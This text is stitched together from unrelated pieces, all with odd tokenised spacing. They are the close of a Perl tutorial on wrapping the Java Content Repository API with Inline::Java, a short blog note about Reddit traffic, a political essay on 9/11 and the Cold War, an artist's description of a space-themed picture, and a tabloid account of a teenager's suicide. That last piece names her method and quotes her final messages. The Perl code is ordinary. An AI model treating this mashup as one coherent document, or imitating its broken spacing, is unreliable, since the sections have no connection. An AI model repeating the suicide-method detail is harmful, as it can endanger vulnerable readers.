This function looks for any of the generated wrapper objects ( anything that isa Java : : JCR : : Base ) in the list of arguments and unwraps the generated stub by pulling the obj key out of the blessed hash .
sub _process_args { my @args ; for my $ arg ( @_ ) { if ( UNIVERSAL ::isa( $arg , ' Java : : JCR : : Base ' ) ) { push @args , $ arg - > {obj} ; } else { push @args , $ arg ; } } return @args ; }
The wrapper then executes the wrapped method on the generated stub by passing it the unwrapped arguments ( as if the wrappers were n’t there ) .
I make sure to wrap every call in an eval because Inline : : Java passes Java exceptions as Perl exception objects .
If an exception is thrown , I wrap it in a custom class named Java : : JCR : : Exception , which I wrote by hand .
Finally , the code returns the result .
If the return type has a wrapper , as is the case in login ( ) ) , I use Java:: JCR :: Base ::_process_return ( ) to cast the class and wrap it .
sub _process_return { my $ result = shift ; my $ java_package = shift ; my $ perl_package = shift ; # Null is null if (! defined $ result ) { return $ result ; } # Process array results elsif ( $ java_package =~ /^Array : (.*) $/) { my $ real_package = $ 1 ; return [ map { bless { obj => cast ( $ real_package , $ _ ) } , $ perl_package } @{ $ result } ] ; } # Process scalar results else { return bless { obj => cast ( $ java_package , $ result ) , } , $ perl_package ; } }
This brings up two considerations :
Why the custom exception class ?
Why do I need to cast the object ?
In both cases , I do this to handle minor issues in Inline : : Java .
In the case of exceptions , the generated exception objects do n’t handle Perl stringification very well .
Because a lot of exception handlers assume that exceptions are strings or properly stringified , this can be ( and has been for me ) a problem .
My exception class makes sure stringification works the right way .
As for the cast , Inline : : Java works on the assumption that you want to use the class in its most specific form , but if it has n’t studied that form , you get a generic object on which you cannot call any methods .
Rather than engage the potentially costly AUTOSTUDY option to make sure Inline : : Java studies everything and then smarten up the wrappers more , I ’ve chosen to cast the objects into the expected return type .
This does limit some of the flexibility .
Loading Packages
Other than the custom pieces , I needed some additional helpers to get the job done .
I did n’t want to write out a lot of use statements to use this library .
As a JAPH , I like to keep things simple .
Therefore , if I need to use the JCR and Jackrabbit , I just want to say :
use Java:: JCR ; use Java::JCR :: Jackrabbit ;
I included a package loader in the main package , Java: : JCR , that will take care of these details and then created a package for each of the subpackages in the JCR .
The loader looks like :
sub import_my_packages { my ( $ package_name , $ package_file ) = caller ; my % excludes = map { $ _ => 1 } @_ ; my $ package_dir = $ package_file ; $ package_dir =~ s/.pm$ // ; my $ package_glob = File :: Spec->catfile ($package_dir , '*. pm ' ) ; for my $ package ( glob $ package_glob ) { $ package =~ s/^$ package_dir/// ; $ package =~ s/.pm$// ; $ package =~ s///::/g ; next if $ excludes { $ package} ; eval " use $ {package_name} : : $ package ; " ; if ( $@ ) { carp " Error loading $ package : $ @ " } } }
I make sure to call that method once the package has finished loading and pass in exclusions to keep it from loading all the subpackages .
This needs further enhancement to allow for future extensions under the Java: : JCR namespace , so as not to load them automatically , but this is a good starting point .
I built one class for each subpackage , then , that inherits from Java : : JCR and then calls this method to load each of those classes .
Connecting to Jackrabbit
Obviously , the next step was to create the code to connect to Jackrabbit .
This was done in Java :: JCR :: Jackrabbit .
The initial implementation is very simple :
use base qw ( Java::JCR :: Base Java:: JCR :: Repository ) ; use Inline ( Java => ' STUDY ' , STUDY => [ ] , ) ; use Inline :: Java qw ( study_classes ) ; study_classes (['org.apache.jackrabbit.core.TransientRepository ' ] , ' Java : : JCR ' ) ; sub new { my $ class = shift ; return bless { obj =>
Java::JCR::org :: apache::jackrabbit::core::TransientRepository -> new (@_ ) , } , $ class ; }
I extended Java:: JCR :: Repository to add a constructor that calls the Jackrabbit constructor .
Done .
Handling Special Cases
With all that work , I still could n’t make the second hop because I still had n’t resolved the whole problem of passing an array of characters .
However , with the infrastructure I had in place , this was now solvable .
I created an additional YAML configuration file named specials.yml .
This file contains hand - coded alternatives to use where appropriate .
I then wrote an alternative for the new constructor :
javax.jcr.SimpleCredentials : new : |- sub new { my $ class = shift ; my $ user = shift ; my $ password = shift ; my $ charArray = Java : : JCR :: PerlUtils -> charArray( $password ) ; return bless { obj =>
Java::JCR :: javax :: jcr::SimpleCredentials ->new( $user , $ charArray ) , } , $ class ; }
Then , I reran the generator script .
Fortunately , I had already improved it to use any implemented method or constructor rather than generating one automatically .
To perform the conversion , I also needed to embed a little extra Java code .
I wrote a very small Java class called PerlUtils for handling the conversion :
use Inline ( Java => <<' END_OF_JAVA ' , class PerlUtils { public static char [ ] charArray ( String str ) { return str.toCharArray ( ) ; } } END_OF_JAVA ) ;
Given a string , it returns an array of characters to pass back into the SimpleCredentials constructor .
No other work is necessary .
I could now perform the JCR second hop in Perl ( ex/secondhop.pl ) .
That script attaches to a Jackrabbit repository , logs in as “ username ” with password “ password ” and then creates a node .
Using Handles as InputStreams
The third ( and final ) hop of the Jackrabbit tutorial demonstrates node import using an XML file .
However , in order to perform the import shown , you must pass an InputStream off to the importXML ( ) method .
While Inline :: Java provides the ability to use Java InputStream s as Perl file handles , it does n’t provide the mapping in the opposite direction .
Thus I needed another special handler and an additional set of helper methods .
The special code configuration looks like :
javax.jcr.Session : import_xml : |- sub import_xml { my $ self = shift ; my $ path = shift ; my $ handle = shift ; my $ behavior = shift ; my $ input_stream = Java : : JCR ::JavaUtils ::input_stream ( $ handle ) ; $ self->{obj}->importXML ( $ path , $ input_stream , $ behavior ) ; }
This calls the input_stream ( ) method , which is a Perl subroutine .
sub input_stream { my $ glob = shift ; my $ glob_val = $ $ glob ; $ glob_val =~ s/^\*// ; my $ glob_caller = Java:: JCR:: GlobCaller ->new( $ glob_val ) ; return Java :: JCR::GlobInputStream ->new( $ glob_caller ) ; }
As you can see , this subroutine uses two separate Java classes to provide the interface from a Perl file handle to Java InputStream .
The first class , Java : : JCR :: GlobCaller , performs most of the real work using the callback features provided by Inline : : Java .
It gets passed to the Java : : JCR :: GlobInputStream , which calls read ( ) whenever the JCR reads from the stream :
public int read ( ) throws InlineJavaException , InlineJavaPerlException { String ch = ( String ) CallPerlSub ( " Java : : JCR::JavaUtils::read_one_byte " , new Object [ ] { this .glob } ) ; return ch != null ? ch.charAt(0 ) : - 1 ; }
The read_one_byte ( ) function is a very basic wrapper for the Perl built - in getc .
sub read_one_byte { my $ glob = shift ; my $c = getc $ glob ; return $ c ; }
With this in place , you can now perform the third JCR hop in Perl .
By executing this script , you will connect to a repository , log in , and then create nodes and properties from an XML file .
Getting Ready to Distribute
The implementation is now , more or less , complete .
You can use Java: : JCR to connect to a Jackrabbit repository , log in , create nodes and properties , and import data from XML .
There ’s a lot left untested , but the essentials are now present .
With this done , I was ready to begin getting ready for the distribution .
However , because some Java libraries are requirements to use the library , the library has some special needs to build and install easily .
You should be able to install it by just running :
% cpan Java::JCR
I needed a way to build this library .
My preferred build tool is Ken Williams ’ Module : : Build .
It ’s in common use , compatible with the CPAN installer , and cooperates well with g- cpan.pl , which is a packaging tool for my favorite Linux distribution , Gentoo .
Finally , it ’s easy to extend .
When customizing Module : : Build , I prefer to create a custom build module rather than by placing the extension directly inline with the Build .
PL file .
In this case , I ’ve called the module Java : : JCR : : Build .
I placed it inside a directory named inc / with the rest of the tools I built for generating the package .
After creating the basic module that extends Module : : Build , I added a custom action to fetch the JAR files called get_jars .
I also added the code to execute this action on build by extending the code ACTION :
sub ACTION_get_jars { my $ self = shift ; eval " require LWP :: UserAgent " or die " Failed to load LWP :: UserAgent : $ @ " ; my $ mirror_dir = File : : Spec - > catdir ( $ self -> blib , ' lib ' , ' Java ' , ' JCR ' ) ; mkpath ( $ mirror_dir , 1 ) ; my $ ua = LWP :: UserAgent -> new ; print " Checking for needed jar files ...n " ; while ( my ( $ file , $url ) = each % jars ) { my $ path = File : : Spec -> catfile ( $ mirror_dir , $ file ) ; $ self -> add_to_cleanup ( $ path ) ; next if -f $ path ; my $ response = $ ua -> mirror ( $url , $ path ) ; if ( $ response ->is_success ) { print " Mirroring $url to $ file .n " ; } elsif ( $ response -> is_error ) { die " An error occurred fetching $url to $ file : " , $ response -> status_line , " n " ; } } } sub ACTION_code { my $ self = shift ; $ self - > ACTION_get_jars ; $ self - > SUPER ::ACTION_code ; }
I use Gisle Aas ’s LWP :: UserAgent to fetch the JAR files from the public Maven repositories and drop them into the build library folder , blib .
Module : : Build will take care of the rest by copying those JAR files to the appropriate location during the install process .
I also needed some code in Java: : JCR to set the CLASSPATH correctly ahead of time :
my $ classpath ; BEGIN { my @classpath ; my $ this_path = $ INC {' Java / JCR. pm'} ; $ this_path =~ s/.pm$ // ; my $ jar_glob = File :: Spec -> catfile ( $ this_path , " *. jar " ) ; for my $ jar_file ( glob $ jar_glob ) { push @classpath , $ jar_file ; } $ classpath = join ' :' , @classpath , ( $ENV {'CLASSPATH'} || '' ) ; $ ENV {'CLASSPATH'} = $ classpath ; }
This bit of code asks
Perl for the path to the location of this library , which I assume is the installed location of the JAR files .
Then , I find each file ending with . jar in that directory and put them into the CLASSPATH .
Unfortunately , my code assumes a Unix environment when it uses the colon as the path separator .
A future revision could make sure that this works on other systems as well , but because I use only Unix - based operating systems , my motivation is lacking .
With all that , you can now deploy this by downloading the tarball and running :
% perl Build .
PL % ./ Build % ./ Build test % ./ Build install
It works !
Testing
I have n’t mentioned this yet , but during the whole process of building this library , I also built a series of test cases .
You can find these in the t/ directory of the distribution .
The first few tests are actually just variations on the Jackrabbit tutorial , as well as a test to make sure the POD documentation contains no errors ( every module author should use this test ; you can just copy and paste it into any project ) .
Final Thoughts
I love Perl .
This port from Java to Perl was easier than I would have thought possible .
I wanted to share my success in the hopes of spurring on others .
Kudos go to Ken Williams and Patrick LeBoutillier and the others that have assisted them to build the tools that made this possible .
Cheers .
A Banner Day at Reddit
In response to yesterday ’s post about how our site was overwhelmed by Reddit traffic , which was a response to a post two days earlier about the economics of libraries , Reddit co-founder Alexis ( knOthing ) Ohanian has weighed in on the matter , going so far as to make our Freakonomics apple / orange the Reddit logo of the day .
I do n’t know whether to say thank you or … well … yeah , thank you .
Seriously , thanks .

DIGG THIS
With the collapse of the Berlin Wall , American leaders declared “ victory ” in the Cold War no less firmly or repeatedly than our President has promised “ victory ” in his Global War on Terror — no less than 12 times , in fact , in an August speech to the American Legion National Convention .
However , as Andrew Bacevich , author of The New American Militarism , recently wrote , victory in our times turns out to be a remarkably quicksilver concept , especially since “ the East has solved the riddle of the Western Way of War … [ T ]he Arabs now possess — and know that they possess — the capacity to deny us victory , especially in any altercation that occurs on their own turf and among their own people . ”
Triumphantly here today ( as your generals sit grinning behind a marble table in one of Saddam ’s palaces ) , victory is gone tomorrow ( as the IEDs start to explode and the suicide car bombs begin to mount ) .
In the case of the Cold War , the question remains : Was that victory actually gone yesterday ?
Was it gone by the time officials danced their victory jigs in the corridors of the Pentagon and the White House ?
In retrospect , it may be — as perceptive scholars of imperial decline like Immanuel Wallerstein have long argued — that we were already definitively on the way down ; or , put another way , that there was no victor but there were two losers in the Cold War ; that the Soviet Union , the weaker of the two great powers , simply imploded first ; while the U.S. , enwreathed in a rhetoric of triumph and self - congratulation , was slowly making its way to the door without waving goodbye .
In the fifteen years since the USSR evaporated , most indices of power , especially military power , have been challenged .
To offer but a single sobering example , historian Gabriel Kolko , discussing how destructive power has been “ democratized , ” points out that :
“ U.S. power has been dependent to a large extent on the country ’s highly mobile navy .
But ships are increasingly vulnerable to missiles , and while they are a long way from finished , they are more and more circumscribed tactically and , ultimately , strategically …
[ Iran , for example ] possesses large quantities of [ cruise ] missiles , and US experts believe they may very well be capable of destroying aircraft - carrier battle groups .
All attempts to devise defenses against these rockets , even the most primitive , have been expensive failures , and anti-missile technology everywhere has remained , after decades of effort and billions of dollars , unreliable . ”
When , back in the 1960s , Senator J. William Fulbright wrote of “ the arrogance of power ” as a defining trait of America ’s leaders , few in power took him seriously .
So many years later , the question is :
Do our present arrogant leaders have the faintest idea how limited their powers really are ?
As Ira Chernus , author of Monsters To Destroy : The Neoconservative War on Terror and Sin , suggests below , on this fifth anniversary of the September 11th attacks , the leadership of an increasingly cornered empire continues to put its emphasis not just on striking back , but on striking first … and wherever .
This is the most dangerous , the most blinding and fearful legacy of the 9/11 attacks .
In the long run , it threatens a world in rubble .

The Day That Changed Everything Was n’t 9/11
By Ira Chernus
Yes , it changed everything — not September 11 , 2001 , when the Twin Towers collapsed , but November 9 , 1989 , when the Berlin Wall fell and left the U.S. at sea , drifting without an enemy in a strange new world .
Through four decades of the Cold War , Americans had been able to feel reasonably united in their determination to fight evil .
And everyone , even children , knew the name of the evildoers : “ the commies . ”
Within two years after the Wall fell , the Soviet Union had simply disappeared .
In the U.S. , nobody really knew how to fight evil now , or even who the evildoers were .
The world ’s sole remaining superpower was “ running out of demons , ” as Colin Powell complained .
Amid the great anguish of September 11 , 2001 , it was hard to sense the paradoxical but very real feeling of relief that flooded across the country .
After a decade adrift with no foes to oppose , Americans could sink back into a comfortingly black - and - white world , neatly divided into the good guys and the bad guys , the innocent and the guilty .
In the hands of the Bush administration , “ terrorists , ” modest as their numbers might have been , turned out to be remarkably able stand - ins for a whole empire - plus of “ commies . ”
They became our all - purpose symbol for the evil that fills our waking nightmares .
Today the very word “ terrorist ” conjures up anxiety - ridden images worthy of the Cold War era — images of an unpredictable world always threatening to spin out of control .
As then , so now , sinister evil is said to lurk everywhere — even right next door — always ready to spring upon unsuspecting victims .
Historians , considering the last decades of our history , are well aware that millions of Americans did n’t need the attacks of 9/11 to fear that their world was spinning out of control .
As the Cold War waned , profound differences on “ values ” issues ( previously largely kept under wraps ) came out of the closet .
Societal anxiety rose .
Many wondered how long a nation could endure if it had no consensus on “ moral matters ” and no obvious authority figures to turn to .
Many feared they would lose their moral anchor in an increasingly confusing and challenging world .
This was the real terror that the Bush administration played upon when the Twin Towers fell .
It took no time at all for the President to be right on Manichaean message : “ We ’ve seen that evil is real . ”
“ It is enough to know that evil , like goodness , exists . ”
He did not have to say the rest explicitly , because ( with a sigh of relief and endless rites of ceremonial mourning )
Americans understood it : Goodness exists here in the good old USA .
How do we know ?
Because evil itself attacked us and we are so firmly committed to fighting it .
Such circular logic fed public discourse from the springs of a deeply buried unconscious longing for power , clarity , and innocence .
Once again we could stand tall in the world , the dazzling hyperpower of hyperpowers .
As long as we were fighting evil , we had to be the good guys .
If we were n’t so good , why would we be so determined to fight the supposedly new evil of global terrorism ?
Of course , it worked the other way around , too :
The only way to prove that we were good was by hunting out and fighting evil .
If we were to keep on feeling certain that we were the good guys , a steady supply of bad guys was a necessity — and the post - Cold War decade just had n’t done its job providing them .
So it could easily seem more appealing to launch a generational Global War on Terror that would keep the “ terrorists ” around permanently .
What better way to keep on proving our virtue than by combating and containing them forever ?
The New Normalcy
The neoconservatives understand all this perfectly well — and well before September 11 , 2001 .
For years , they had dreamed of preserving American virtue ( and American global dominance ) by flaunting American military might .
They just needed an ongoing series of excuses to do the flaunting .
The attacks of 9/11 gave them their chance .
Dick Cheney , Donald Rumsfeld , and Condoleezza Rice ( all products of the Cold War era ) said it clearly in the weeks following the attack .
Their new war would not be a straightforward World War II - style march to victory .
It would be more like … well , the war they knew , the Cold War , with its endless string of conflicts , crises , containments , and battles in the frontier lands of what used to be called the Third World .
And it would be forever .
As Cheney put it , “ There ’s not going to be an end date when we ’re going to say , u2018 There , it ’s all over with . ' ”
And he classically summed things up this way : “ Many of the steps we have now been forced to take will become permanent in American life . … I think of it as the new normalcy . ”
The neocons were glad to see the war on terrorism revive memories of the days when — they imagine — we contained the commies , learned to stop worrying , and loved the bomb ( despite all its terror ) .
It was a strange love that they remembered so fondly .
Polls made it clear that we never really stopped worrying then — and polls make it clear that we still have n’t now .
Now , as then , we just bury the terror ever deeper and console ourselves as best we can with the mercilessness of our enemies and the relative safety of our own neck of the woods .
A recent poll tells us that only 14 % of Americans feel safer now than they did five years ago .
Seventy - nine percent expect another attack on U.S. soil within the next year , and 60 % think it ’s likely in the next few months .
Four out of five say that “ we will always have to live with the threat of terrorism , ” though only one in five admits to being “ personally very concerned about an attack ” in his or her own area .
A Florida woman captured the prevailing mood when she told a reporter : “ When I stop to think about it , I do n’t feel very safe .
But then again , on a day - to - day basis , I feel fine . ”
As Rep. Peter King , chair of the House Homeland Security Committee , put it : “ It ’s like we live in two parallel existences . ”
Those words should sound awfully familiar to anyone who lived through the Cold War years .
The war on terrorism has revived the Cold War mindset , in which we are all citizens of a national insecurity state .
The terror of impending annihilation from a vast , conspiratorial , and evil enemy has again become the vague backdrop of everyday life .
To assure ourselves of our absolute goodness , we must see the enemy as absolute evil ; not a collection of human beings bent on harming us , but a network of monsters bent on — and capable of — destroying us utterly .
In other words , Cheney ’s “ new normalcy ” is but a version of an older , deeper apocalyptic terror .
Every loss — of a diplomatic conflict or an economic tussle or a pair of skyscrapers — is once again framed as a portent of looming doom for the nation .
Any successful attack upon us , we are told , could bring down the curtain of Armageddon .
Here ’s the irony .
Unlike the nuclear - armed Soviet Union in the Cold War years , terrorists cannot actually threaten to obliterate our country or destroy the planet .
But each apocalyptic warning of war to the death by the Bush administration only hastens another kind of loss — the loss of the American imperial power they so prize .
Cornered Empire ?
Even if actual extinction does n’t threaten , when it seems to , a nation , like an animal , is tempted to fight back with no holds barred .
That ’s the attitude Bush and the neocons have tried to inculcate since 9/11 .
It ’s the only attitude , they insist , that can save America ’s military might and moral fiber .
Indeed , for hard - core neocons , the main point of their global - war - on - terror policies is to revive this very Cold War mentality .
Yet those policies have obviously backfired terribly .
The war on terrorism was supposed to build a new American century — a unipolar world in which the U.S. would reign supreme .
But every day it looks more and more like the 21st century will be the multipolar century , with any number of powerful nations and regional groupings successfully challenging U.S. economic , diplomatic , and military preeminence .
Bush and his neocon advisors certainly do n’t bear all the blame for an American imperial decline .
But their utter misreading of the nature of U.S. military power and their lack of interest in economic and diplomatic realities has certainly hastened along a process that , in some fashion , was bound to happen anyway .
The United States reached the peak of its power in the late 1940s .
The meat - grinder of World War II had chewed up all the other great powers and their colonial empires , too .
In the ensuing decades , as the others recovered and once - dominated nations like China and India broke free and gained traction , the world moved inevitably toward a multipolar future .
Cold war presidents from Truman to Reagan hastened the process by building up U.S. allies like Germany and Japan in order to stave off the evil empire .
And they sometimes even heeded the call of those allies to refrain from using military force ( or too much of it anyway ) , lest a global war be triggered .
Empowering our allies , while keeping them militarily subservient , actually helped them grab a bigger slice of the global economic pie , encouraging the rise of multipolarism .
Big mistake , the neocons declared as , after 9/11 , they set the Bush administration on an aggressive course of unilateralism , aiming at their dream of a New - Rome - style unipolarism .
Looking back , it ’s easy to see what a big mistake they made — even in their own terms .
Their unilateralism and militarism accelerated to near warp speed the decline of U.S. power and influence around the world .
Every military blow or threatened blow only multiplied American enemies ; every shock - and - awe action only created more opposition , even from increasingly standoffish allies .
In the years to come , for an economically weakened “ last superpower , ” there will be more and more occasions , on more and more fronts , when the U.S. will meet its match and have to back down .
None of these will spell doom for us .
But in context of the national insecurity state , they ’re likely to be framed as apocalyptic defeats , harbingers of the end time itself , and , above all , good reason to fight back blindly with all our might .
This is the vicious circle from Hell .
The Bush administration ’s aggressive policies weaken U.S. power .
Then its officials try to frighten the public into supporting the very same aggressive policies .
We were stuck in a similar cycle , only half - recognized , throughout the Cold War years , and there ’s no end in sight .
So far , it looks like not much has changed at all since 9/11 .
But we do n’t have to stay stuck .
There ’s nothing inevitable about history .
Some 160 years after the French Revolution , Chinese Prime Minister Zhou Enlai was asked how that event had changed the world .
“ It ’s too soon to tell , ” Zhou replied impishly .
Five short years after 9/11 , it ’s way too soon to tell if the attacks of that day actually “ changed everything , ” or if they changed much of anything at all .
Already , there is a growing awareness that the Bush Global War on Terror is doing more harm than good .
Even from the foreign policy elite we can hear ( though still often faintly ) voices saying it ’s time to call it off .
For now , the talk is narrowly focused on our imperial well - being — the weakening of U.S. power and interests around the world .
Perhaps , as losses mount , Americans will eventually see the more important truth : Simplistic moralism and a pervasive fear of apocalyptic disaster weaken our society here at home .
They make every step toward positive change look like a looming danger and that plays right into the hands of conservatives who are dedicated to preventing the change we need so badly .
If the failed war on terror eventually teaches us this lesson , 9/11 will turn out to be the day that did indeed change everything .

Short description : Enjoy .
Thorough Description : So here is the result of 3 days of work on this .
If you 're familiar with my work , this might remind you of " cosmic ocean , " a very similar deviation , but with beaches instead of a road , and with some fish here and there .
This was originally going to be the second version , but i got another idea and decided to use a similar " theme " and leave out the whole ocean thing aside .
This is a long deviation because i tried to include a lot of things that are found in space , such as planets , galaxies , nebulae , comets , asteroids , stars , dust , and space ships .
Needless to say , scales be damned ( since all of this could fit in a very tiny spec of a galaxy ) .
The idea of starting the whole thing with an inverted picture was spontaneous , since i was testing sky transitions .
When i saw it , the idea of " there is no upside - down in space " came to mind , so i left it there ) .
I did recycle some things , such as the big asteroid at the bottom and the planet rings .
Overall im pretty happy with how this turned out , I think it 's one of my best works .
The only thing i could think of spending more time on are the nebulae at the bottom half , but i have other stuff to take care of so i left them like that , which is n't too shabby .
Thank you for having a look at the deviation , reading my long description , and perhaps leaving a thought or 2 .

The utter pointlessness of
Rosemary Edwards ' death is
what makes it so heart - breaking .
Recounting the final days before
their 15 - year - old daughter took
her own life in the depths of the
New Forest , her parents David and
Jennifer describe a scenario familiar to
the parents of any teenager .
Quite what sparked her death has remained a
mystery until now .
But yesterday they told the
Mail how , the week before she died , Rosemary
had helped herself to a can of fizzy drink and
some sweets at the little village shop where she
worked part - time to earn some pocket money .
It was a minor misdemeanour and , say her
parents , totally out of character for their bright ,
fun -loving youngest daughter .
" But after the shop
owner found out , they felt Rosemary could n't be
trusted , " says her father .
" She was given the
chance to tell us what had happened , rather than
having the owner tell us why she had lost her job .
But she did n't . "
Instead , Rosemary told her family that she had
simply given up the job because it was boring .
It
was only a week later , when her mother Jennifer
popped into the shop , that her lie was
discovered .
" I told the owner I was sorry that Rosemary
had left them in the lurch , " she recalls .
" And the
owner explained what had really happened . "
This apparently small crisis in the life of this
close - knit , loving , hard - working family should
have been resolved by the telling - off and the " let's
say no more about it " conversation that followed .
But somehow , the seemingly trivial events
of that day — Tuesday , September 4 , the
night before her new school term began —
sparked a chain of events that culminated in
unbearable tragedy .
That evening , she sent text messages to four
teenage boys she had befriended on social
networking websites .
In one she wrote : " I want to
die . "
In another : " I could either run or I could kill
myself , but I 've got nowhere to run to . "
The last one , sent to all four at around
8.30 pm , said : " I love you . "
What is so extraordinary about such
dramatic statements is that they came
from a girl with no previous record of
making any such comments .
Later that night , one of the boys
Rosemary had contacted rang the
family home in Dibden Purlieu , near
Southampton , and asked for
Rosemary .
Scroll down for more ...
Her mother explained that she
was in bed asleep and , believing she
must be safe , the boy rang off without
mentioning the suicidal messages .
Some time after 10.30 pm , however ,
Rosemary slipped out of the house ,
which borders the New Forest , and
after walking ten miles into one of the
remotest wooded areas hanged herself
with a length of orange bale twine .
Now , sitting with his wife and with
tears running down his face , her bereft
father attempts to make sense of what
she chose to do .
" We ca n't understand
how she could have done it , not just to
us , but to her brother and sister , " says
David , an electronics consultant .
" They were incredibly close .
There was no
fighting , just closeness and laughter .
She had so much to live for . "
He and Jennifer , who have two other
children , 19 - year - old medical student
Lucy and 17 - year - old A - level student
Robert , speak in the tortured tones of
parents struggling to comprehend how
their horse - mad daughter could have
thrown her life away for such an
apparently trivial reason .
They have forensically dissected the
events of Rosemary 's last day " a
thousand times in our heads " , but
refuse to blame one another .
" Blame is destructive , " says David .
" It tears
people apart . "
Certainly no one can possibly
blame them for disciplining
their daughter after she had
lied to them .
" We did n't want
her to go off the rails , " says
Jennifer .
" It was a shock because we'd
had no trouble at all with any of our
children .
We did n't want it to be the
start of something . "
On the day that her mother , who
works as a secretary , discovered her
untruth , Rosemary was in Wales
with her sister Lucy , who was busy
sorting out accommodation for her
second year studying medicine at
Cardiff University .
David recalls : " When Rosemary got
back , I just said : ' We need to have a
talk . '
And she just ran upstairs and
locked herself in the bathroom .
Scroll dowm for more ...
" I think she possibly hated herself
because of the circumstances under
which she had lost her job , because it
was completely out of character .
" She had such a strong sense of what
was right and what was wrong .
Maybe there was a degree of
self - loathing there . "
His voice breaks when he recalls the
words he spoke to her through the
locked bathroom door .
" It ca n't have helped — what I said to
her .
I told her she had lost people 's
trust .
I also told her I was disappointed
in her .
" Maybe that was a trigger for
feeling she had no friends or no
self - worth , even though that was patently
not the case . "
As a punishment , he temporarily
banned his daughter from riding .
But
while Rosemary was tearful and sulky
for the rest of the evening as so many
adolescents would be , she did sit down
with the family for dinner .
" She ate a bit , but she did n't speak , "
says Jennifer .
" There were six of us ,
including Lucy 's boyfriend , Ollie , and
we just chatted away as normal . "
Later in the evening , Rosemary had a
bath and washed her hair — a fact
which her mother later desperately
clung onto after they realised she was
missing .
" It did n't strike me as the
behaviour of someone planning to take
their own life , " she says .
Around 10.30 pm , David and Jennifer
went upstairs to speak to their
daughter .
" I asked her for her phone , " recalls
David .
" We 'd grounded her and I did n't
want her to stay up all night texting
people .
She had school the next day .
" Rosemary switched it off and handed
it to me .
I asked her for a hug , but she
said no .
She was still half - sobbing , so I
kissed her on the cheek . "
Now , he is overcome with
regret , and he wishes he'd told
her how much he loved her .
" How could I have known that
was the last time I would ever
see her , " he says , sobbing .
" Maybe if I
had said that , she would not have done
what she did . "
Jennifer also spoke to her : " I said :
' Let 's try to draw a line under this .
Tomorrow is another day . '
Rosemary
said something like ' fine ' or ' OK ' .
" Her sister Lucy had also gone in to see her
and said that they would go to the
beach on Sunday .
Rosemary said that
would be nice . "
That was the last time Rosemary 's
family saw her alive .
In the middle of
the night , the headstrong teenager
walked out of the house , leaving
behind her purse as well as her
precious MP3 music player , which she
usually took everywhere .
Her absence was n't discovered until
David went to wake her at 7.40 am .
" I was calling her for school , " he says .
" When I found she had gone , I ran
around the house checking all the
rooms .
I checked the garden and
the garage . "
David speaks of an instant and
overwhelming sense of dread , which
deepened when he switched on Rosemary 's
phone and read the last text messages
she had sent to the four teenage boys .
Ten minutes after discovering
that his daughter was missing , he
dialled 999 .
The hours that followed were filled
with desperate activity .
While waiting
for the police , Jennifer telephoned her
daughter 's friends , asking if they 'd
heard from or seen her .
David drove
around the stables where his daughter
rode .
Later , he took the family 's two
dogs into the New Forest , " in case she
was sitting there , thinking about stuff " .
When the police arrived , her
anguished text messages quickly made
it clear that Rosemary 's disappearance
was very serious .
The case was handed
over to Hampshire CID .
For hour after agonising hour , the
couple searched the area , desperately
hoping the phone would ring .
That
night , neither David nor Jennifer slept .
" We left the house unlocked all night
in case she came back , " says David .
He also took Rosemary 's bag , which
she carried everywhere , and put it in
his and Jennifer 's bedroom , " so she
could n't sneak in during the night , take
it and go again " , he says .
From the start , David feared the
worst .
Jennifer was more hopeful ,
despite the text messages .
" I remember
what it was like to be a teenager , " she
says .
" Kids express these thoughts .
I
thought it was an idle threat . "
And there was nothing to suggest
that there was anything seriously
wrong in their daughter 's life .
The
couple describe her as the most
outgoing of their three children — with
an enormous sense of humour ,
combined with a love of animals and
the outdoors .
Jennifer recalls how , from the age
of three , Rosemary would wander
around the garden carrying the family 's
pet Bantam chicken , Speckles , under
her arm .
David remembers the day four years ago when he and Rosemary ,
aged just 11 , climbed Scafell Pike in
the Lake District .
Then there were
the family holidays this summer :
surfing in Devon and a week on a
narrow boat in which she revelled in
the outdoor life .
" You think life is just perfect and you
do n't know what 's around the corner , "
says David simply , still barely able to
comprehend how his family 's
happiness has been shattered overnight .
Like her older sister and brother
before her , Rosemary was also doing
well at the state - run Noadswood
School in Dibden Purlieu .
She had
taken two GCSEs a year early and
earned an A in maths and B in art this
summer .
She planned to take science
A - levels and train as a vet .
Certainly ,
there was nothing to suggest
anything was wrong at school .
" We were always aware that she
might be put under pressure by Lucy
and Robert doing so well , " says
Jennifer , " but we always told her that
we did n't mind what she did , as long
as she tried .
But she did well anyway .
She had no worries about school . "
Not , despite her internet
friendships , had Rosemary shown any
intense interest in boys .
" She had n't
reached the boyfriend stage , " says
Jennifer .
" In the past three months ,
she had suddenly blossomed , but she
did n't seem aware of her own
sexuality or how beautiful she was . "
Nearly all Rosemary 's free time
was spend riding .
She and her best
friend Poppy advertised on
equestrian websites , offering to exercise
people 's horses .
The Sunday before
she died , say her parents , Rosemary
had fixed up a new job caring for
someone 's horses .
All these thoughts occupied her
parents ' minds as they waited for
news in the days following
Rosemary 's disappearance .
With every
passing hour , their darkest fears
loomed larger .
Several days after her
disappearance , the couple made an
emotional media appeal for
her return , which catapulted
her story into the national
consciousness .
Meanwhile , fingertip searches of her
bedroom by police , checks on her
computer and interviews with the
boys she had met online all failed to
offer any concrete explanation as
to why Rosemary would want to take
her own life .
But the news that they had been
dreading came last Sunday night .
As
soon as David opened the door to a
police family liaison officer , he knew
what was coming .
In a way , he says , it
was almost a relief .
" It would have
been far , far worse if she 'd been
abducted or murdered .
In the end , it
was her choice , " says David .
" And after
two - and - a- half weeks we had already
started the grieving process . "
Rosemary 's body had been found by
a couple trying to train a new dog ,
which had run off into the forest .
" Rosemary was n't near any path , " says
David .
" I imagine she would have
walked through the forest .
She knew all
the tracks from her horse - riding .
She
walked to Ashurst , crossed the main
road and kept on walking through the
forest to the place where she died .
" She could have remained there for
years undiscovered .
I do n't think I
could ever find the place again . "
Jennifer says : " We think she wanted to
find somewhere we would n't find her
because she did n't want to upset us . "
On Tuesday , the whole family
visited the spot where their
daughter died .
It was , they say ,
" a real comfort " .
" It was like a
weight lifting , " says Jennifer .
" It was very peaceful .
The sun was shining
through the trees .
We know from the
way she died she would not have
suffered any real pain . "
Certainly , the discovery of Rosemary 's
body has eased the couple 's anguish in
some ways , but now they must
confront the brutal fact of her death .
The family has been offered
counselling , which they say they will
probably take up after Rosemary 's
funeral next week at St Andrew's
Church in Dibden Purlieu .
They talk about Rosemary a lot
together as a family and are
encouraging their other two children not to
bottle up their feelings about their
sister 's death .
" We are determined that the family is
going to come through this and it won't
wreck anybody else 's life , " says David .
The terrible truth is that Rosemary 's
decision to end her life may have been
made in the heat of an emotional crisis .
For that reason alone , her parents
have decided to speak out .
